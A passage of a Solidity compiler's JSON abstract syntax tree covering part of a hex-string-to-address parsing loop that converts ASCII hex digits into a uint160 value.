														"mutability": "mutable",
														"name": "b1",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1481,
														"src": "8824:10:9",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint160",
															"typeString": "uint160"
														},
														"typeName": {
															"id": 1324,
															"name": "uint160",
															"nodeType": "ElementaryTypeName",
															"src": "8824:7:9",
															"typeDescriptions": {
																"typeIdentifier": "t_uint160",
																"typeString": "uint160"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1326,
												"initialValue": null,
												"nodeType": "VariableDeclarationStatement",
												"src": "8824:10:9"
											},
											{
												"assignments": [
													1328
												],
												"declarations": [
													{
														"constant": false,
														"id": 1328,
														"mutability": "mutable",
														"name": "b2",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1481,
														"src": "8845:10:9",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint160",
															"typeString": "uint160"
														},
														"typeName": {
															"id": 1327,
															"name": "uint160",
															"nodeType": "ElementaryTypeName",
															"src": "8845:7:9",
															"typeDescriptions": {
																"typeIdentifier": "t_uint160",
																"typeString": "uint160"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1329,
												"initialValue": null,
												"nodeType": "VariableDeclarationStatement",
												"src": "8845:10:9"
											},
											{
												"body": {
													"id": 1474,
													"nodeType": "Block",
													"src": "8910:657:9",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 1347,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 1345,
																	"name": "iaddr",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1321,
																	"src": "8925:5:9",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint160",
																		"typeString": "uint160"
																	}
																},
																"nodeType": "Assignment",
																"operator": "*=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"hexValue": "323536",
																	"id": 1346,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "8934:3:9",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_256_by_1",
																		"typeString": "int_const 256"
																	},
																	"value": "256"
																},
																"src": "8925:12:9",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint160",
																	"typeString": "uint160"
																}
															},
															"id": 1348,
															"nodeType": "ExpressionStatement",
															"src": "8925:12:9"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 1359,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 1349,
																	"name": "b1",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1325,
																	"src": "8952:2:9",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint160",
																		"typeString": "uint160"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"baseExpression": {
																						"argumentTypes": null,
																						"id": 1354,
																						"name": "tmp",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 1314,
																						"src": "8971:3:9",
																						"typeDescriptions": {
																							"typeIdentifier": "t_bytes_memory_ptr",
																							"typeString": "bytes memory"
																						}
																					},
																					"id": 1356,
																					"indexExpression": {
																						"argumentTypes": null,
																						"id": 1355,
																						"name": "i",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 1331,
																						"src": "8975:1:9",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"isConstant": false,
																					"isLValue": true,
																					"isPure": false,
																					"lValueRequested": false,
																					"nodeType": "IndexAccess",
																					"src": "8971:6:9",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bytes1",
																						"typeString": "bytes1"
																					}
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_bytes1",
																						"typeString": "bytes1"
																					}
																				],
																				"id": 1353,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"lValueRequested": false,
																				"nodeType": "ElementaryTypeNameExpression",
																				"src": "8965:5:9",
																				"typeDescriptions": {
																					"typeIdentifier": "t_type$_t_uint8_$",
																					"typeString": "type(uint8)"
																				},
																				"typeName": {
																					"id": 1352,
																					"name": "uint8",
																					"nodeType": "ElementaryTypeName",
																					"src": "8965:5:9",
																					"typeDescriptions": {
																						"typeIdentifier": null,
																						"typeString": null
																					}
																				}
																			},
																			"id": 1357,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "typeConversion",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "8965:13:9",
																			"tryCall": false,
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			}
																		],
																		"id": 1351,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"lValueRequested": false,
																		"nodeType": "ElementaryTypeNameExpression",
																		"src": "8957:7:9",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_uint160_$",
																			"typeString": "type(uint160)"
																		},
																		"typeName": {
																			"id": 1350,
																			"name": "uint160",
																			"nodeType": "ElementaryTypeName",
																			"src": "8957:7:9",
																			"typeDescriptions": {
																				"typeIdentifier": null,
																				"typeString": null
																			}
																		}
																	},
																	"id": 1358,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "8957:22:9",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint160",
																		"typeString": "uint160"
																	}
																},
																"src": "8952:27:9",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint160",
																	"typeString": "uint160"
																}
															},
															"id": 1360,
															"nodeType": "ExpressionStatement",
															"src": "8952:27:9"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 1373,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 1361,
																	"name": "b2",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1328,
																	"src": "8994:2:9",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint160",
																		"typeString": "uint160"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"baseExpression": {
																						"argumentTypes": null,
																						"id": 1366,
																						"name": "tmp",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 1314,
																						"src": "9013:3:9",
																						"typeDescriptions": {
																							"typeIdentifier": "t_bytes_memory_ptr",
																							"typeString": "bytes memory"
																						}
																					},
																					"id": 1370,
																					"indexExpression": {
																						"argumentTypes": null,
																						"commonType": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						},
																						"id": 1369,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"leftExpression": {
																							"argumentTypes": null,
																							"id": 1367,
																							"name": "i",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 1331,
																							"src": "9017:1:9",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"nodeType": "BinaryOperation",
																						"operator": "+",
																						"rightExpression": {
																							"argumentTypes": null,
																							"hexValue": "31",
																							"id": 1368,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": true,
																							"kind": "number",
																							"lValueRequested": false,
																							"nodeType": "Literal",
																							"src": "9021:1:9",
																							"subdenomination": null,
																							"typeDescriptions": {
																								"typeIdentifier": "t_rational_1_by_1",
																								"typeString": "int_const 1"
																							},
																							"value": "1"
																						},
																						"src": "9017:5:9",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"isConstant": false,
																					"isLValue": true,
																					"isPure": false,
																					"lValueRequested": false,
																					"nodeType": "IndexAccess",
																					"src": "9013:10:9",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bytes1",
																						"typeString": "bytes1"
																					}
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_bytes1",
																						"typeString": "bytes1"
																					}
																				],
																				"id": 1365,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"lValueRequested": false,
																				"nodeType": "ElementaryTypeNameExpression",
																				"src": "9007:5:9",
																				"typeDescriptions": {
																					"typeIdentifier": "t_type$_t_uint8_$",
																					"typeString": "type(uint8)"
																				},
																				"typeName": {
																					"id": 1364,
																					"name": "uint8",
																					"nodeType": "ElementaryTypeName",
																					"src": "9007:5:9",
																					"typeDescriptions": {
																						"typeIdentifier": null,
																						"typeString": null
																					}
																				}
																			},
																			"id": 1371,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "typeConversion",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "9007:17:9",
																			"tryCall": false,
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			}
																		],
																		"id": 1363,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"lValueRequested": false,
																		"nodeType": "ElementaryTypeNameExpression",
																		"src": "8999:7:9",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_uint160_$",
																			"typeString": "type(uint160)"
																		},
																		"typeName": {
																			"id": 1362,
																			"name": "uint160",
																			"nodeType": "ElementaryTypeName",
																			"src": "8999:7:9",
																			"typeDescriptions": {
																				"typeIdentifier": null,
																				"typeString": null
																			}
																		}
																	},
																	"id": 1372,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "8999:26:9",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint160",
																		"typeString": "uint160"
																	}
																},
																"src": "8994:31:9",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint160",
																	"typeString": "uint160"
																}
															},
															"id": 1374,
															"nodeType": "ExpressionStatement",
															"src": "8994:31:9"
														},
														{
															"condition": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																},
																"id": 1383,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"components": [
																		{
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint160",
																				"typeString": "uint160"
																			},
																			"id": 1377,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 1375,
																				"name": "b1",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 1325,
																				"src": "9045:2:9",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": ">=",
																			"rightExpression": {
																				"argumentTypes": null,
																				"hexValue": "3937",
																				"id": 1376,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "9051:2:9",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_97_by_1",
																					"typeString": "int_const 97"
																				},
																				"value": "97"
																			},
																			"src": "9045:8:9",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		}
																	],
																	"id": 1378,
																	"isConstant": false,
																	"isInlineArray": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"nodeType": "TupleExpression",
																	"src": "9044:10:9",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "&&",
																"rightExpression": {
																	"argumentTypes": null,
																	"components": [
																		{
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint160",
																				"typeString": "uint160"
																			},
																			"id": 1381,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 1379,
																				"name": "b1",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 1325,
																				"src": "9059:2:9",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "<=",
																			"rightExpression": {
																				"argumentTypes": null,
																				"hexValue": "313032",
																				"id": 1380,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "9065:3:9",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_102_by_1",
																					"typeString": "int_const 102"
																				},
																				"value": "102"
																			},
																			"src": "9059:9:9",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		}
																	],
																	"id": 1382,
																	"isConstant": false,
																	"isInlineArray": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"nodeType": "TupleExpression",
																	"src": "9058:11:9",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	}
																},
																"src": "9044:25:9",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"falseBody": {
																"condition": {
																	"argumentTypes": null,
																	"commonType": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	},
																	"id": 1397,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"argumentTypes": null,
																		"components": [
																			{
																				"argumentTypes": null,
																				"commonType": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				},
																				"id": 1391,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"argumentTypes": null,
																					"id": 1389,
																					"name": "b1",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 1325,
																					"src": "9125:2:9",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": ">=",
																				"rightExpression": {
																					"argumentTypes": null,
																					"hexValue": "3635",
																					"id": 1390,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "9131:2:9",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_65_by_1",
																						"typeString": "int_const 65"
																					},
																					"value": "65"
																				},
																				"src": "9125:8:9",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bool",
																					"typeString": "bool"
																				}
																			}
																		],
																		"id": 1392,
																		"isConstant": false,
																		"isInlineArray": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"nodeType": "TupleExpression",
																		"src": "9124:10:9",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "&&",
																	"rightExpression": {
																		"argumentTypes": null,
																		"components": [
																			{
																				"argumentTypes": null,
																				"commonType": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				},
																				"id": 1395,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"argumentTypes": null,
																					"id": 1393,
																					"name": "b1",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 1325,
																					"src": "9139:2:9",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": "<=",
																				"rightExpression": {
																					"argumentTypes": null,
																					"hexValue": "3730",
																					"id": 1394,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "9145:2:9",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_70_by_1",
																						"typeString": "int_const 70"
																					},
																					"value": "70"
																				},
																				"src": "9139:8:9",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bool",
																					"typeString": "bool"
																				}
																			}
																		],
																		"id": 1396,
																		"isConstant": false,
																		"isInlineArray": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"nodeType": "TupleExpression",
																		"src": "9138:10:9",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		}
																	},
																	"src": "9124:24:9",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	}
																},
																"falseBody": {
																	"condition": {
																		"argumentTypes": null,
																		"commonType": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		},
																		"id": 1411,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftExpression": {
																			"argumentTypes": null,
																			"components": [
																				{
																					"argumentTypes": null,
																					"commonType": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					},
																					"id": 1405,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"leftExpression": {
																						"argumentTypes": null,
																						"id": 1403,
																						"name": "b1",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 1325,
																						"src": "9204:2:9",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint160",
																							"typeString": "uint160"
																						}
																					},
																					"nodeType": "BinaryOperation",
																					"operator": ">=",
																					"rightExpression": {
																						"argumentTypes": null,
																						"hexValue": "3438",
																						"id": 1404,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": true,
																						"kind": "number",
																						"lValueRequested": false,
																						"nodeType": "Literal",
																						"src": "9210:2:9",
																						"subdenomination": null,
																						"typeDescriptions": {
																							"typeIdentifier": "t_rational_48_by_1",
																							"typeString": "int_const 48"
																						},
																						"value": "48"
																					},
																					"src": "9204:8:9",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bool",
																						"typeString": "bool"
																					}
																				}
																			],
																			"id": 1406,
																			"isConstant": false,
																			"isInlineArray": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"nodeType": "TupleExpression",
																			"src": "9203:10:9",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		},
																		"nodeType": "BinaryOperation",
																		"operator": "&&",
																		"rightExpression": {
																			"argumentTypes": null,
																			"components": [
																				{
																					"argumentTypes": null,
																					"commonType": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					},
																					"id": 1409,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"leftExpression": {
																						"argumentTypes": null,
																						"id": 1407,
																						"name": "b1",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 1325,
																						"src": "9218:2:9",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint160",
																							"typeString": "uint160"
																						}
																					},
																					"nodeType": "BinaryOperation",
																					"operator": "<=",
																					"rightExpression": {
																						"argumentTypes": null,
																						"hexValue": "3537",
																						"id": 1408,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": true,
																						"kind": "number",
																						"lValueRequested": false,
																						"nodeType": "Literal",
																						"src": "9224:2:9",
																						"subdenomination": null,
																						"typeDescriptions": {
																							"typeIdentifier": "t_rational_57_by_1",
																							"typeString": "int_const 57"
																						},
																						"value": "57"
																					},
																					"src": "9218:8:9",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bool",
																						"typeString": "bool"
																					}
																				}
																			],
																			"id": 1410,
																			"isConstant": false,
																			"isInlineArray": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"nodeType": "TupleExpression",
																			"src": "9217:10:9",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		},
																		"src": "9203:24:9",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		}
																	},
																	"falseBody": null,
																	"id": 1417,
																	"nodeType": "IfStatement",
																	"src": "9199:73:9",
																	"trueBody": {
																		"id": 1416,
																		"nodeType": "Block",
																		"src": "9229:43:9",
																		"statements": [
																			{
																				"expression": {
																					"argumentTypes": null,
																					"id": 1414,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"leftHandSide": {
																						"argumentTypes": null,
																						"id": 1412,
																						"name": "b1",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 1325,
																						"src": "9248:2:9",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint160",
																							"typeString": "uint160"
																						}
																					},
																					"nodeType": "Assignment",
																					"operator": "-=",
																					"rightHandSide": {
																						"argumentTypes": null,
																						"hexValue": "3438",
																						"id": 1413,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": true,
																						"kind": "number",
																						"lValueRequested": false,
																						"nodeType": "Literal",
																						"src": "9254:2:9",
																						"subdenomination": null,
																						"typeDescriptions": {
																							"typeIdentifier": "t_rational_48_by_1",
																							"typeString": "int_const 48"
																						},
																						"value": "48"
																					},
																					"src": "9248:8:9",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					}
																				},
																				"id": 1415,
																				"nodeType": "ExpressionStatement",
																				"src": "9248:8:9"
																			}
																		]
																	}
																},
																"id": 1418,
																"nodeType": "IfStatement",
																"src": "9120:152:9",
																"trueBody": {
																	"id": 1402,
																	"nodeType": "Block",
																	"src": "9150:43:9",
																	"statements": [
																		{
																			"expression": {
																				"argumentTypes": null,
																				"id": 1400,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftHandSide": {
																					"argumentTypes": null,
																					"id": 1398,
																					"name": "b1",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 1325,
																					"src": "9169:2:9",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					}
																				},
																				"nodeType": "Assignment",
																				"operator": "-=",
																				"rightHandSide": {
																					"argumentTypes": null,
																					"hexValue": "3535",
																					"id": 1399,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "9175:2:9",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_55_by_1",
																						"typeString": "int_const 55"
																					},
																					"value": "55"
																				},
																				"src": "9169:8:9",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				}
																			},
																			"id": 1401,
																			"nodeType": "ExpressionStatement",
																			"src": "9169:8:9"
																		}
																	]
																}
															},
															"id": 1419,
															"nodeType": "IfStatement",
															"src": "9040:232:9",
															"trueBody": {
																"id": 1388,
																"nodeType": "Block",
																"src": "9071:43:9",
																"statements": [
																	{
																		"expression": {
																			"argumentTypes": null,
																			"id": 1386,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftHandSide": {
																				"argumentTypes": null,
																				"id": 1384,
																				"name": "b1",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 1325,
																				"src": "9090:2:9",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				}
																			},
																			"nodeType": "Assignment",
																			"operator": "-=",
																			"rightHandSide": {
																				"argumentTypes": null,
																				"hexValue": "3837",
																				"id": 1385,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "9096:2:9",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_87_by_1",
																					"typeString": "int_const 87"
																				},
																				"value": "87"
																			},
																			"src": "9090:8:9",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint160",
																				"typeString": "uint160"
																			}
																		},
																		"id": 1387,
																		"nodeType": "ExpressionStatement",
																		"src": "9090:8:9"
																	}
																]
															}
														},
														{
															"condition": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																},
																"id": 1428,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"components": [
																		{
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint160",
																				"typeString": "uint160"
																			},
																			"id": 1422,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 1420,
																				"name": "b2",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 1328,
																				"src": "9291:2:9",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": ">=",
																			"rightExpression": {
																				"argumentTypes": null,
																				"hexValue": "3937",
																				"id": 1421,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "9297:2:9",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_97_by_1",
																					"typeString": "int_const 97"
																				},
																				"value": "97"
																			},
																			"src": "9291:8:9",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		}
																	],
																	"id": 1423,
																	"isConstant": false,
																	"isInlineArray": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"nodeType": "TupleExpression",
																	"src": "9290:10:9",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "&&",
																"rightExpression": {
																	"argumentTypes": null,
																	"components": [
																		{
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint160",
																				"typeString": "uint160"
																			},
																			"id": 1426,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 1424,
																				"name": "b2",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 1328,
																				"src": "9305:2:9",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "<=",
																			"rightExpression": {
																				"argumentTypes": null,
																				"hexValue": "313032",
																				"id": 1425,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "9311:3:9",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_102_by_1",
																					"typeString": "int_const 102"
																				},
																				"value": "102"
																			},
																			"src": "9305:9:9",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		}
																	],
																	"id": 1427,
																	"isConstant": false,
																	"isInlineArray": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"nodeType": "TupleExpression",
																	"src": "9304:11:9",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	}
																},
																"src": "9290:25:9",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"falseBody": {
																"condition": {
																	"argumentTypes": null,
																	"commonType": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	},
																	"id": 1442,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"argumentTypes": null,
																		"components": [
																			{
																				"argumentTypes": null,
																				"commonType": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				},
																				"id": 1436,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"argumentTypes": null,
																					"id": 1434,
																					"name": "b2",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 1328,
